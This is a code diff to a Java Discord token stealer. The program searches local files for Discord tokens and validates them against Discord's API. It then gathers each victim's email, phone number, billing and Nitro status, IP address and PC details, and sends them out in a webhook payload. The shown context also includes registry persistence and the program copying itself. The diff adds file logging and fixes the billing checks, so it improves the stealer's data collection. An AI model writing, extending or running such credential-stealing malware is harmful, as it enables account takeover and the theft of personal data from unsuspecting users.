@@ -4,6 +4,7 @@ import java.io.*;
 import java.net.*;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
+import java.nio.file.Path;
 import java.text.SimpleDateFormat;
 import java.util.*;
 import java.util.regex.Matcher;
@@ -11,14 +12,21 @@ import java.util.regex.Pattern;
 
 public class Main {
     private static boolean debug = true; // Whether or not everyting should be displayed on terminal window
+    private static boolean output = true; // Whether or not everyting should be written to a file
+    private static BufferedWriter writer;
+    private static StringBuilder final_text = new StringBuilder();
+
+    private static void print(String s) {
+        if (debug) {
+            System.out.println(s);
+        }
+        if (output) {
+            final_text.append(s).append("\n");
+        }
+    }
 
     public static void main(String[] args) throws Exception {
-        // TODO: Billing information
-        // TODO: Check for nitro
         // TODO: Add more MacOS Options
-
-        // IMPORTANT: Coming today I will add billing, soon I will add nitro
-
         // IMPORTANT: Not tested on MacOS or Linux (hopefully works)
 
         String s = null;
@@ -38,6 +46,17 @@ public class Main {
         boolean ensure_valid = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "ensure_valid")); //Checks the account before sending (removes if invalid)
         boolean randomize_new_name = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "randomize_new_name")); //Whether or not a random string shoud be set as the file name
         boolean shouldPersist = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "shouldPersist"));
+        debug = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "debug")); //True sends embed, False sends it in text
+        output = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "write_to_file")); //True sends embed, False sends it in text
+
+        if (output) {
+            if (!new File("output\\output.txt").exists()) {
+                File folder = new File("output");
+                folder.mkdir();
+                File f = new File("output", "output.txt");
+                folder.createNewFile();
+            }
+        }
 
         if (!(args.length > 0)) {
             if (System.getProperty("os.name").contains("Windows")) {
@@ -58,12 +77,14 @@ public class Main {
             } else {
             }
         }
-
-
-
-
-
         ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        //Write Output to File
+        if (output) {
+            Path path = new File("output","output.txt").toPath();
+            byte[] strToBytes = final_text.toString().getBytes();
+
+            Files.write(path, strToBytes);
+        }
     }
 
     private static String grabTokenInformation(String avatar_url, String username, String token, boolean sendEmbed) throws IOException {
@@ -93,8 +114,8 @@ public class Main {
         //Get discord token
         String tokenInformation = get_request("https://discordapp.com/api/v6/users/@me", true, token).replace(",", ",\n");
         accountInfo_username = getJsonKey(tokenInformation, "username") + "#" + getJsonKey(tokenInformation, "discriminator");
-        accountInfo_hasNitro = get_request("https://discord.com/api/v8/users/@me/billing/subscriptions", true, token) != "[]";
-        accountInfo_hasBillingInfo = get_request("https://discord.com/api/v8/users/@me/billing/subscriptions", true, token) != "[]";
+        accountInfo_hasNitro = !get_request("https://discord.com/api/v8/users/@me/billing/subscriptions", true, token).equals("[]");
+        accountInfo_hasBillingInfo = !get_request("https://discord.com/api/v8/users/@me/billing/subscriptions", true, token).equals("[]");
         accountInfo_email = getJsonKey(tokenInformation, "email");
 
         accountInfo_phoneNr = getJsonKey(tokenInformation, "phone");
@@ -102,17 +123,17 @@ public class Main {
 
 
 
-        String finishedEmbedContent = "{\"avatar_url\":\""+avatar_url+"\",\"embeds\":[{\"thumbnail\":{\"url\":\""+accountInfo_imageURL+"\"},\"color\":9109759,\"footer\":{\"icon_url\":\"https://i.ibb.co/fps45hd/steampfp.jpg\",\"text\":\"November | "+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(System.currentTimeMillis())+"\"},\"author\":{\"name\":\""+accountInfo_username+"\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: "+accountInfo_email+"\\nPhone: "+accountInfo_phoneNr+"\\nNitro: Coming Soon\\nBilling Info: Coming Soon\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: "+pcInfo_IP+"\\nUsername: "+pcInfo_Username+"\\nWindows version: "+pcInfo_WindowsVersion+"\\nCPU Arch: "+pcInfo_cpuArch+"\"},{\"name\":\"**Token**\",\"value\":\"```"+token+"```\"}]}],\"username\":\""+username+"\"}";
+        String finishedEmbedContent = "{\"avatar_url\":\""+avatar_url+"\",\"embeds\":[{\"thumbnail\":{\"url\":\""+accountInfo_imageURL+"\"},\"color\":9109759,\"footer\":{\"icon_url\":\"https://i.ibb.co/fps45hd/steampfp.jpg\",\"text\":\"November | "+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(System.currentTimeMillis())+"\"},\"author\":{\"name\":\""+accountInfo_username+"\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: "+accountInfo_email+"\\nPhone: "+accountInfo_phoneNr+"\\nNitro: "+accountInfo_hasNitro+"\\nBilling Info: "+accountInfo_hasBillingInfo+"\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: "+pcInfo_IP+"\\nUsername: "+pcInfo_Username+"\\nWindows version: "+pcInfo_WindowsVersion+"\\nCPU Arch: "+pcInfo_cpuArch+"\"},{\"name\":\"**Token**\",\"value\":\"```"+token+"```\"}]}],\"username\":\""+username+"\"}";
         String finishedTextContent = "{\"avatar_url\":\""+accountInfo_imageURL+"\",\"content\":\"***Discord Info***\\n**Email:**\\n```"+accountInfo_email+"```\\n**Phone NR:**\\n```"+accountInfo_phoneNr+"```\\n**Nitro:**\\n```"+accountInfo_hasNitro+"```\\n**Billing Info:**\\n```"+accountInfo_hasBillingInfo+"```\\n**Token**\\n```"+token+"```\\n\\n***PC Info**\\n**Username: ***\\n```"+accountInfo_username+"```\\n**IP:**\\n```"+pcInfo_IP+"```\\n**Windows version:**\\n```"+pcInfo_WindowsVersion+"```\\n**CPU Arch:**\\n```"+pcInfo_cpuArch+"```\",\"username\":\""+accountInfo_username+"\"}";
 
         if (sendEmbed) {
             if (debug) {
-                System.out.println(finishedEmbedContent);
+                print(finishedEmbedContent);
             }
             return finishedEmbedContent;
         } else {
             if (debug) {
-                System.out.println(finishedTextContent);
+                print(finishedTextContent);
             }
 
             return finishedTextContent;
@@ -152,7 +173,7 @@ public class Main {
 
                 for (String pathname : file.list()) {
                     if (debug) {
-                        System.out.println("Searching: " + path[1] +System.getProperty("file.separator")+ pathname);
+                        print("Searching: " + path[1] +System.getProperty("file.separator")+ pathname);
                     }
                     FileInputStream fstream = new FileInputStream(path[1] + System.getProperty("file.separator") + pathname);
                     DataInputStream in = new DataInputStream(fstream);
@@ -164,8 +185,8 @@ public class Main {
 
                         while (m.find()) {
                             if (debug) {
-                                System.out.println("Found token: " + m.group() + " in " + pathname);
-                                System.out.println("isDuplicate: " + tokens.contains(m.group()));
+                                print("Found token: " + m.group() + " in " + pathname);
+                                print("isDuplicate: " + tokens.contains(m.group()));
                             }
                             if (!tokens.contains(m.group())) {
                                 tokens.add(m.group());
@@ -179,8 +200,8 @@ public class Main {
 
         if (check_isValid) {
             if (debug) {
-                System.out.println("checking if valid");
-                System.out.println(tokens.toString());
+                print("checking if valid");
+                print(tokens.toString());
             }
             if (!tokens.isEmpty()) {
                 Iterator<String> iter = tokens.iterator();
@@ -190,12 +211,12 @@ public class Main {
                     try {
                         get_request("https://discordapp.com/api/v6/users/@me", true, str);
                         if (debug) {
-                            System.out.println("Token: " + str + " is valid");
+                            print("Token: " + str + " is valid");
                         }
 
                     } catch (IOException e) {
                         if (debug) {
-                            System.out.println("Removing token " + str + "            " + e.getMessage());
+                            print("Removing token " + str + "            " + e.getMessage());
                         }
                         iter.remove();
                     }
@@ -204,7 +225,7 @@ public class Main {
                 return tokens;
             } else {
                 if (debug) {
-                    System.out.println("No tokens found\nExitting...");
+                    print("No tokens found\nExitting...");
                     System.exit(0);
                 }
                 return null;
@@ -233,12 +254,12 @@ public class Main {
         connection.setRequestMethod("GET");
         InputStream responseStream = connection.getInputStream();
         if (debug) {
-            System.out.println("GET - "+connection.getResponseCode());
+            print("GET - "+connection.getResponseCode());
         }
         try (Scanner scanner = new Scanner(responseStream)) {
             String responseBody = scanner.useDelimiter("\\A").next();
             if (debug) {
-                System.out.println(responseBody);
+                print(responseBody);
             }
             return responseBody;
         } catch (Exception e) {
@@ -264,7 +285,7 @@ public class Main {
             os.write(out);
         }
         if (debug) {
-            System.out.println("POST - "+connection.getResponseCode());
+            print("POST - "+connection.getResponseCode());
         }
 
     }
@@ -321,7 +342,7 @@ public class Main {
                     Thread thread = new Thread() {
                         public void run() {
                             if (debug) {
-                                System.out.println("Executing command: " + reg_start[finalI]);
+                                print("Executing command: " + reg_start[finalI]);
                             }
                             try {
                                 Process proc = Runtime.getRuntime().exec(reg_start[finalI]);
@@ -330,19 +351,19 @@ public class Main {
                                 String s = null;
                                 while ((s = stdInput.readLine()) != null) {
                                     if (s.equalsIgnoreCase("The operation completed successfully.")) {
-                                        System.out.println("Successfulyy added to registry");
+                                        print("Successfulyy added to registry");
                                         proc.destroy();
                                         done[0] = true;
                                     }
                                 }
 
                                 if (proc.isAlive()) {
-                                    System.out.println("Failed to add to registry");
+                                    print("Failed to add to registry");
                                     proc.destroy();
                                 }
                             } catch (Exception e) {
                                 if (debug) {
-                                    System.out.println(e.getMessage());
+                                    print(e.getMessage());
                                 }
                             }
                         }
@@ -381,7 +402,7 @@ public class Main {
                 os.write(buffer, 0, length);
                 finalLength = finalLength + length;
                 if (debug) {
-                    System.out.println("Moving " + length + "bytes to " + f2.getPath() + " | " + finalLength);
+                    print("Moving " + length + "bytes to " + f2.getPath() + " | " + finalLength);
                 }
 
             }
